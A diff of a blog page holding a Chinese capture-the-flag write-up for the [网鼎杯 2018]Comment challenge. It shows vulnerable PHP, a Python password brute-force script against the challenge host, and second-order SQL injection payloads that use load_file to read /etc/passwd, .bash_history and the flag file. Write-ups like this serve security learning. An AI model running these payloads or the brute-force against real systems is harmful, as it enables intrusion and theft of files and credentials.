@@ -229,60 +229,60 @@
 <li>特殊文件识别和利用</li>
 </ul>
 <p>用githack将文件下载下来：</p>
-<p>![1](..&#x2F;images&#x2F;[网鼎杯 2018]Comment&#x2F;1.png)</p>
+<p><img src="/../images/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DComment/1.png" alt="1"></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    <span class="variable">$category</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    <span class="variable">$title</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    <span class="variable">$bo_id</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;bo_id&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$category</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./comment.php?id=<span class="subst">$bo_id</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>可以存在明显的二次注入，从<code>wrtie</code>功能写入，在<code>comment</code>功能执行，<code>category</code>字段可以用来使用payload，可以构造如下格式的payload。</p>
 <p>先访问登录页面<code>login.php</code>查看下。</p>
-<p>![2](..&#x2F;images&#x2F;[网鼎杯 2018]Comment&#x2F;2.png)</p>
+<p><img src="/../images/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DComment/2.png" alt="2"></p>
 <p>注意到其中账户密码的默认填充字符，需要注意此处就是出题人给出的提示，账户为<code>zhangwei</code>密码为<code>zhangwei***</code>，其中的<code>***</code>为三位的未知字符串需要我们爆破。</p>
 <p>这里先<code>***</code>测试为纯数字的情况。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests as res</span><br><span class="line">import time</span><br><span class="line">url=&quot;http://2b661b6a-7be0-408c-84e4-0aa48b856bee.node4.buuoj.cn:81/login.php&quot;</span><br><span class="line">def change(num):</span><br><span class="line">        return (&#x27;0&#x27;*(3-len(str(num))))+str(num)</span><br><span class="line"></span><br><span class="line">for num in range(648,1000):</span><br><span class="line">        resp=res.post(url=url,data=&#123;&quot;username&quot;:&quot;zhangwei&quot;,&quot;password&quot;:&quot;zhangwei&#123;&#125;&quot;.format(change(num))&#125;)</span><br><span class="line">        print(change(num)+&#x27;=&gt;&#x27;+str(len(resp.text)))</span><br><span class="line">        time.sleep(0.3)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>![3](..&#x2F;images&#x2F;[网鼎杯 2018]Comment&#x2F;3.png)</p>
+<p><img src="/../images/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DComment/3.png" alt="3"></p>
 <p>可以看到<code>***</code>的实际值为<code>666</code>，用得到的账户和密码进行登录，接下来就可以进行二次登录了。</p>
 <p>先写入在写入功能写入payload，如下body部分中参数<code>category</code>中<code>content=database()</code>部分的<code>database()</code>可以替换为其他SQL查询语句或者函数，payload其余部分则可视为固定。</p>
-<p>![4](..&#x2F;images&#x2F;[网鼎杯 2018]Comment&#x2F;4.png)</p>
+<p><img src="/../images/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DComment/4.png" alt="4"></p>
 <p>接着在评论功能触发二次注入，同样在此的payload也视为固定（注意项目的SQL语句为多行，所以需要<code>#</code>和<code>/**/</code>配合使用）。</p>
-<p>![5](..&#x2F;images&#x2F;[网鼎杯 2018]Comment&#x2F;5.png)</p>
+<p><img src="/../images/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DComment/5.png" alt="5"></p>
 <p>然后就能在对应的详情页面的留言部分查看到注入后的结果。</p>
-<p>![6](..&#x2F;images&#x2F;[网鼎杯 2018]Comment&#x2F;6.png)</p>
+<p><img src="/../images/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DComment/6.png" alt="6"></p>
 <p>按照惯例去依次查找下库、表、字段。</p>
 <figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">title=<span class="keyword">test</span>&amp;category=<span class="keyword">test</span>&#x27;,content=(select(group_concat(schema_name))from(information_schema.schemata)),/*&amp;content=<span class="keyword">test</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
 
-<p>![7](..&#x2F;images&#x2F;[网鼎杯 2018]Comment&#x2F;7.png)</p>
+<p><img src="/../images/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DComment/7.png" alt="7"></p>
 <figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=<span class="keyword">test</span>&amp;category=<span class="keyword">test</span>&#x27;,content=(select(group_concat(table_name))from(information_schema.tables)where((table_schema)=(database()))),/*&amp;content=<span class="keyword">test</span></span><br></pre></td></tr></table></figure>
 
-<p>![8](..&#x2F;images&#x2F;[网鼎杯 2018]Comment&#x2F;8.png)</p>
+<p><img src="/../images/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DComment/8.png" alt="8"></p>
 <p>但查到字段时就发现，无论在那个表都找不到flag相关的字段，这里尝试读取下文件是否可行。</p>
 <figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=<span class="keyword">test</span>&amp;category=<span class="keyword">test</span>&#x27;,content=((select(load_file(<span class="string">&quot;/etc/passwd&quot;</span>)))),/*&amp;content=<span class="keyword">test</span></span><br></pre></td></tr></table></figure>
 
 
 
-<p>![9](..&#x2F;images&#x2F;[网鼎杯 2018]Comment&#x2F;9.png)</p>
+<p><img src="/../images/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DComment/9.png" alt="9"></p>
 <p>成功了，并且可以发现WEB系统用户home目录竟然在<code>/home</code>下，尝试去读取下其操作记录。</p>
 <figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=<span class="keyword">test</span>&amp;category=<span class="keyword">test</span>&#x27;,content=((select(load_file(<span class="string">&quot;/home/www/.bash_history&quot;</span>)))),/*&amp;content=<span class="keyword">test</span></span><br></pre></td></tr></table></figure>
 
-<p>![10](..&#x2F;images&#x2F;[网鼎杯 2018]Comment&#x2F;10.png)</p>
+<p><img src="/../images/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DComment/10.png" alt="10"></p>
 <p>可以看到当前项由<code>html.zip</code>在原本<code>/tmp</code>目录下解压再复制到<code>/var/www</code>，并且记录了关于项目<code>html</code>文件结构的<code>.DS_Store</code>在<code>/tmp</code>目录中仍存在一份，去读取这个文件了解下项目结构。</p>
 <figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=<span class="keyword">test</span>&amp;category=<span class="keyword">test</span>&#x27;,content=((select(load_file(<span class="string">&quot;/tmp/html/.DS_Store&quot;</span>)))),/*&amp;content=<span class="keyword">test</span></span><br></pre></td></tr></table></figure>
 
-<p>![11](..&#x2F;images&#x2F;[网鼎杯 2018]Comment&#x2F;11.png)</p>
+<p><img src="/../images/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DComment/11.png" alt="11"></p>
 <p>可能由于乱码问题所以无法完全读取，这里采用对其转成16进制。</p>
 <figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=<span class="keyword">test</span>&amp;category=<span class="keyword">test</span>&#x27;,content=((select(hex(load_file(<span class="string">&quot;/tmp/html/.DS_Store&quot;</span>))))),/*&amp;content=<span class="keyword">test</span></span><br></pre></td></tr></table></figure>
 
-<p>![12](..&#x2F;images&#x2F;[网鼎杯 2018]Comment&#x2F;12.png)</p>
+<p><img src="/../images/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DComment/12.png" alt="12"></p>
 <p>可以将得到的16进制写入文件再用相关的.DS_Store文件解析器去解析，但是此处都没显示完全（可以看到16进制末尾是一串…），所以直接转换成ASCII字符来查看也是可行的。</p>
-<p>![13](..&#x2F;images&#x2F;[网鼎杯 2018]Comment&#x2F;13.png)</p>
+<p><img src="/../images/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DComment/13.png" alt="13"></p>
 <p>可以识别出上图红框中文件与flag相关，去去读下，为了保险起见先尝试hex处理后的内容。</p>
 <figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=<span class="keyword">test</span>&amp;category=<span class="keyword">test</span>&#x27;,content=((select(load_file(<span class="string">&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;</span>)))),/*&amp;content=<span class="keyword">test</span></span><br></pre></td></tr></table></figure>
 
 
 
-<p>![14](..&#x2F;images&#x2F;[网鼎杯 2018]Comment&#x2F;14.png)</p>
-<p>![15](..&#x2F;images&#x2F;[网鼎杯 2018]Comment&#x2F;15.png)</p>
+<p><img src="/../images/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DComment/14.png" alt="14"></p>
+<p><img src="/../images/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DComment/15.png" alt="15"></p>
 <p>找到flag。</p>
 
         </div>
@@ -340,7 +340,7 @@
                 <a class="prev" rel="prev" href="/2024/06/11/HarekazeCTF2019-encode-and-encode/">[HarekazeCTF2019]encode_and_encode</a>
             
             
-            <a class="next" rel="next" href="/2024/06/08/%5BSWPUCTF%202018%5DSimplePHP/">'[SWPUCTF 2018]SimplePHP'</a>
+            <a class="next" rel="next" href="/2024/06/08/%5BSWPUCTF%202018%5DSimplePHP/">[SWPUCTF 2018]SimplePHP</a>
             
         </section>
 
